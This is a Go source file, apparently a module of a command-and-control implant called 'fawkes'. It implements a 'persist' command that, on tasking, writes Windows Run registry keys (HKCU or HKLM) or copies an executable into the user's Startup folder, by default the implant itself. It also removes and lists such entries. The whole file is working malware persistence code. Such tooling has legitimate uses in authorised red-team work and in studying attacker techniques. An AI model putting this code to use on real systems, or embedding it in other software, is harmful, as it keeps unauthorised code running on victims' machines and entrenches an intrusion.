//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows/registry"
)

type PersistCommand struct{}

func (c *PersistCommand) Name() string {
	return "persist"
}

func (c *PersistCommand) Description() string {
	return "Install or remove persistence mechanisms"
}

type persistArgs struct {
	Method string `json:"method"`
	Action string `json:"action"`
	Name   string `json:"name"`
	Path   string `json:"path"`
	Hive   string `json:"hive"`
}

func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
	var args persistArgs

	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required (method, action, name, path)",
			Status:    "error",
			Completed: true,
		}
	}

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if args.Action == "" {
		args.Action = "install"
	}

	switch strings.ToLower(args.Method) {
	case "registry", "reg-run":
		return persistRegistryRun(args)
	case "startup-folder", "startup":
		return persistStartupFolder(args)
	case "list":
		return listPersistence(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown method: %s. Use: registry, startup-folder, or list", args.Method),
			Status:    "error",
			Completed: true,
		}
	}
}

// persistRegistryRun adds/removes a registry Run key entry
func persistRegistryRun(args persistArgs) structs.CommandResult {
	if args.Name == "" {
		return structs.CommandResult{
			Output:    "Error: name is required for registry persistence",
			Status:    "error",
			Completed: true,
		}
	}

	// Determine hive — default to HKCU (doesn't need admin)
	hive := strings.ToUpper(args.Hive)
	if hive == "" {
		hive = "HKCU"
	}

	var hiveKey registry.Key
	var regPath string
	switch hive {
	case "HKCU":
		hiveKey = registry.CURRENT_USER
		regPath = `Software\Microsoft\Windows\CurrentVersion\Run`
	case "HKLM":
		hiveKey = registry.LOCAL_MACHINE
		regPath = `Software\Microsoft\Windows\CurrentVersion\Run`
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: unsupported hive '%s'. Use HKCU or HKLM", hive),
			Status:    "error",
			Completed: true,
		}
	}

	switch strings.ToLower(args.Action) {
	case "install":
		if args.Path == "" {
			// Default to current executable
			exe, err := os.Executable()
			if err != nil {
				return structs.CommandResult{
					Output:    fmt.Sprintf("Error getting executable path: %v", err),
					Status:    "error",
					Completed: true,
				}
			}
			args.Path = exe
		}

		key, _, err := registry.CreateKey(hiveKey, regPath, registry.SET_VALUE)
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error opening %s\\%s: %v", hive, regPath, err),
				Status:    "error",
				Completed: true,
			}
		}
		defer key.Close()

		if err := key.SetStringValue(args.Name, args.Path); err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error writing registry value: %v", err),
				Status:    "error",
				Completed: true,
			}
		}

		return structs.CommandResult{
			Output:    fmt.Sprintf("Installed registry run key:\n  Key:   %s\\%s\n  Name:  %s\n  Value: %s", hive, regPath, args.Name, args.Path),
			Status:    "success",
			Completed: true,
		}

	case "remove":
		key, err := registry.OpenKey(hiveKey, regPath, registry.SET_VALUE)
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error opening %s\\%s: %v", hive, regPath, err),
				Status:    "error",
				Completed: true,
			}
		}
		defer key.Close()

		if err := key.DeleteValue(args.Name); err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error removing value '%s': %v", args.Name, err),
				Status:    "error",
				Completed: true,
			}
		}

		return structs.CommandResult{
			Output:    fmt.Sprintf("Removed registry run key:\n  Key:  %s\\%s\n  Name: %s", hive, regPath, args.Name),
			Status:    "success",
			Completed: true,
		}

	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: unknown action '%s'. Use: install or remove", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

// persistStartupFolder copies a file to the user's Startup folder
func persistStartupFolder(args persistArgs) structs.CommandResult {
	startupDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

	switch strings.ToLower(args.Action) {
	case "install":
		if args.Path == "" {
			exe, err := os.Executable()
			if err != nil {
				return structs.CommandResult{
					Output:    fmt.Sprintf("Error getting executable path: %v", err),
					Status:    "error",
					Completed: true,
				}
			}
			args.Path = exe
		}

		if args.Name == "" {
			args.Name = filepath.Base(args.Path)
		}

		destPath := filepath.Join(startupDir, args.Name)

		// Copy the file to the startup folder
		src, err := os.Open(args.Path)
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error opening source '%s': %v", args.Path, err),
				Status:    "error",
				Completed: true,
			}
		}
		defer src.Close()

		dst, err := os.Create(destPath)
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error creating '%s': %v", destPath, err),
				Status:    "error",
				Completed: true,
			}
		}
		defer dst.Close() // Safety net for panics; explicit Close below catches flush errors
		bytes, err := io.Copy(dst, src)
		if err != nil {
			dst.Close()
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error copying file: %v", err),
				Status:    "error",
				Completed: true,
			}
		}

		if err := dst.Close(); err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error finalizing destination file: %v", err),
				Status:    "error",
				Completed: true,
			}
		}

		return structs.CommandResult{
			Output:    fmt.Sprintf("Installed startup folder persistence:\n  Source: %s\n  Dest:   %s\n  Size:   %d bytes", args.Path, destPath, bytes),
			Status:    "success",
			Completed: true,
		}

	case "remove":
		if args.Name == "" {
			return structs.CommandResult{
				Output:    "Error: name is required to remove startup folder entry",
				Status:    "error",
				Completed: true,
			}
		}

		destPath := filepath.Join(startupDir, args.Name)
		if err := os.Remove(destPath); err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error removing '%s': %v", destPath, err),
				Status:    "error",
				Completed: true,
			}
		}

		return structs.CommandResult{
			Output:    fmt.Sprintf("Removed startup folder entry: %s", destPath),
			Status:    "success",
			Completed: true,
		}

	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: unknown action '%s'. Use: install or remove", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

// listPersistence lists known persistence entries
func listPersistence(args persistArgs) structs.CommandResult {
	var lines []string
	lines = append(lines, "=== Persistence Entries ===\n")

	// Check HKCU Run
	lines = append(lines, "--- HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run ---")
	if entries, err := enumRunKey(registry.CURRENT_USER); err == nil {
		if len(entries) == 0 {
			lines = append(lines, "  (empty)")
		}
		for _, e := range entries {
			lines = append(lines, fmt.Sprintf("  %s = %s", e[0], e[1]))
		}
	} else {
		lines = append(lines, fmt.Sprintf("  Error: %v", err))
	}
	lines = append(lines, "")

	// Check HKLM Run
	lines = append(lines, "--- HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run ---")
	if entries, err := enumRunKey(registry.LOCAL_MACHINE); err == nil {
		if len(entries) == 0 {
			lines = append(lines, "  (empty)")
		}
		for _, e := range entries {
			lines = append(lines, fmt.Sprintf("  %s = %s", e[0], e[1]))
		}
	} else {
		lines = append(lines, fmt.Sprintf("  Error: %v", err))
	}
	lines = append(lines, "")

	// Check Startup folder
	startupDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	lines = append(lines, fmt.Sprintf("--- Startup Folder: %s ---", startupDir))
	entries, err := os.ReadDir(startupDir)
	if err != nil {
		lines = append(lines, fmt.Sprintf("  Error: %v", err))
	} else if len(entries) == 0 {
		lines = append(lines, "  (empty)")
	} else {
		for _, e := range entries {
			info, _ := e.Info()
			size := int64(0)
			if info != nil {
				size = info.Size()
			}
			lines = append(lines, fmt.Sprintf("  %s (%d bytes)", e.Name(), size))
		}
	}

	return structs.CommandResult{
		Output:    strings.Join(lines, "\n"),
		Status:    "success",
		Completed: true,
	}
}

func enumRunKey(hiveKey registry.Key) ([][2]string, error) {
	key, err := registry.OpenKey(hiveKey, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE)
	if err != nil {
		return nil, err
	}
	defer key.Close()

	names, err := key.ReadValueNames(-1)
	if err != nil {
		return nil, err
	}

	var entries [][2]string
	for _, name := range names {
		val, _, err := key.GetStringValue(name)
		if err != nil {
			val = "(error reading)"
		}
		entries = append(entries, [2]string{name, val})
	}
	return entries, nil
}
